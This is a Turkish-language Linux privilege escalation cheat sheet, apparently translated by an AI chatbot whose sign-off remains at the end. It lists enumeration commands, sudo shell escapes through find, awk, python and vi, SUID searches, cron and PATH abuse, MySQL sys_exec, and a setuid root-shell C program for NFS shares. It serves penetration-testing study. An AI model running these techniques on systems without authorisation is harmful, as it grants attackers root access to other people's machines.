### Yetki Yükseltme (Privilege Escalation)  

Bir sınırlı shell erişimi sağladıktan sonra, bu shell’in yetkilerini yükseltmek faydalıdır. Bu şekilde dosyaları gizlemek, okumak, yazmak ve sistem yeniden başlatıldığında kalıcılık sağlamak daha kolay olur.  

Bu bölümde, yaygın **Linux yetki yükseltme tekniklerini** ele alacağız:

- Kernel exploitleri  
- Root olarak çalışan programlar  
- Kurulu yazılımlar  
- Zayıf/yeniden kullanılan/düz metin parolalar  
- İç hizmetlere erişim  
- SUID yanlış yapılandırmaları  
- Sudo haklarının istismarı  
- Root tarafından çağrılan yazılabilir scriptler  
- Hatalı PATH yapılandırmaları  
- Cronjob’lar  
- Montajlanmamış dosya sistemleri  

---

### Enumeration Scriptleri  

Bir makineyi enumerate etmek için genellikle üç script kullandım. Scriptler arasında bazı farklılıklar olsa da çoğu aynı çıktıyı üretir. Hepsini deneyin ve size en uygun olanını seçin.  

#### LinEnum  
[LinEnum - GitHub](https://github.com/rebootuser/LinEnum)  

**Seçenekler:**  
- `-k` Anahtar kelime girin  
- `-e` Çıktı konumu girin  
- `-t` Ayrıntılı (uzun) testleri dahil edin  
- `-r` Rapor adı girin  
- `-h` Yardım metnini gösterir  

---

#### Unix privesc  
[Unix Privesc - Pentest Monkey](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
Scripti çalıştırın, çıktıyı bir dosyada saklayın ve içinde `warning` ifadesini grep ile arayın.

---

#### Linprivchecker.py  
[Linprivchecker.py - GitHub](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)  

---

### Yetki Yükseltme Teknikleri  

#### Kernel Exploitleri  

Linux Kernel’inde bulunan zafiyetler üzerinden yetki yükseltmek mümkündür. Kernel exploitlerini test etmek için genellikle ihtiyacınız olan bilgiler:  

- **İşletim sistemi (OS):**  
- **Mimari (Architecture):**  
- **Kernel sürümü:**  

Bu bilgileri şu komutlarla kontrol edin:  

```bash
uname -a
cat /proc/version
cat /etc/issue
```

**Exploit arama:**  

```bash
site:exploit-db.com kernel version
python linprivchecker.py extended
```

**Dikkat:** Kernel exploitlerini yalnızca başka çare kalmadığında kullanın. Kernel exploitleri, sistemi çökertme veya kararsız hale getirme riski taşır. Ayrıca çok fazla sistem kaydı (`sys.log`) üretebilir. Daha basit bir yöntem bulmaya çalışın ve kernel exploitlerini son çare olarak kullanın.

---

#### Root Olarak Çalışan Programlar  

Eğer root olarak çalışan belirli bir servis bulursanız ve bu servis komut çalıştırabiliyorsa, bu komutları root yetkisiyle çalıştırabilirsiniz. Web sunucuları, veritabanları veya benzeri hizmetlere bakın. Örneğin:  

**Çalışan süreçleri kontrol edin:**  

```bash
# Metasploit
ps

# Linux
ps aux
```

**MySQL:**  

Eğer MySQL root olarak çalışıyorsa ve giriş yapmak için kullanıcı adı/parola biliyorsanız, şu komutları çalıştırabilirsiniz:  

```sql
select sys_exec('whoami');
select sys_eval('whoami');
```

---

#### Kullanıcı Tarafından Yüklenen Yazılımlar  

Kullanıcı tarafından yüklenen üçüncü taraf yazılımlarda zafiyetler olabilir. Aşağıdaki yaygın yazılım dizinlerini kontrol edin:  

```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```

- Debian: `dpkg -l`  
- CentOS, OpenSuse: `rpm -qa`  
- OpenBSD, FreeBSD: `pkg_info`  

---

#### Zayıf/Yeniden Kullanılan/Düz Metin Parolalar  

- Web sunucusunun veritabanına bağlandığı dosyaları kontrol edin (ör. `config.php`).  
- Veritabanında admin parolalarını araştırın.  
- Yaygın zayıf parolaları kontrol edin:  

```text
username:username
username:password
username:admin
username:qwerty
```

Düz metin parola araştırması için:  

```bash
./LinEnum.sh -t -k password
```

---

#### İçeriden Erişilebilir Hizmetler  

Bazı servisler yalnızca o makineden erişilebilir olabilir. Bu servisler root olarak çalışıyor veya zafiyet içeriyor olabilir. **Netstat** ve Nmap taramalarını karşılaştırarak içeriden erişilebilir servisleri bulun:  

```bash
# Linux
netstat -anlp
netstat -ano
```

---

#### SUID ve GUID Yanlış Yapılandırmaları  

SUID biti ayarlanmış bir binary başka bir kullanıcının yetkileriyle çalışır (ör. root). Shell açabilen veya başka şekillerde istismar edilebilen SUID binary’leri bulun.  

**Örnek binary’ler:**  
`nmap`, `vim`, `less`, `nano`, `cp`, `find`, `bash`  

**SUID ve GUID dosyalarını bulma:**  

```bash
# SUID dosyalarını bul
find / -perm -u=s -type f 2>/dev/null

# GUID dosyalarını bul
find / -perm -g=s -type f 2>/dev/null
```

---

#### Sudo Haklarının İstismarı  

Sudo ile çalıştırılabilir programlara erişim varsa, yetkileri yükseltmek için kullanılabilir. Örneğin, `cp` komutuyla `/etc/shadow` dosyasını kendi kötü niyetli dosyanızla değiştirebilirsiniz.  

**Örnekler:**  
```bash
sudo find / -exec bash -i \;
sudo awk 'BEGIN {system("/bin/bash")}'

sudo python
import os
os.system("/bin/bash")

sudo vi
:set shell=/bin/bash
:shell
```

---

#### Root Tarafından Çalıştırılan Yazılabilir Scriptler  

Eğer root tarafından çalıştırılan ancak herkes tarafından yazılabilir bir script bulursanız, bu script’e kötü niyetli bir kod ekleyerek root yetkisi alabilirsiniz.  

**Dünya yazılabilir dosyaları bulun:**  
```bash
find / -writable -type d 2>/dev/null
```

---

#### Kötü PATH Yapılandırmaları  

PATH değişkeninde bir nokta (`.`) bulunuyorsa, mevcut dizindeki scriptler otomatik çalıştırılır. Sistem yöneticileri bu hatayı kolaylık için yapabilir.  

---

#### Cronjob’ların İstismarı  

Privileged (root) olarak çalıştırılan ancak diğer kullanıcılar tarafından düzenlenebilir scriptler varsa bu script’lere kötü niyetli kod eklenebilir.  

Cron job’ları kontrol etmek için:  
```bash
crontab -l
ls -al /etc/ | grep cron
cat /etc/crontab
```

---

#### Montajlanmamış Dosya Sistemleri  

Montajlanmamış dosya sistemleri bulup montajlayarak yetki yükseltmeyi yeniden deneyebilirsiniz:  

```bash
mount -l
cat /etc/fstab
```

---

#### NFS Paylaşımı  

Bir makinede NFS paylaşımı varsa, bunu yetki yükseltmek için kullanabilirsiniz. Eğer yazma izniniz varsa, SUID bir dosya oluşturup çalıştırabilirsiniz.  

```bash
showmount -e 192.168.1.101
mount 192.168.1.101:/ /tmp/
```

C kodu örneği:  
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

---

### Diğer Yararlı Bilgiler  

**Dünya yazılabilir dizinler:**  
```bash
/tmp
/var/tmp
/dev/shm
```

Eksiksiz şekilde Türkçeye çevirdim. Daha fazla sorunuz varsa lütfen paylaşın! 😊
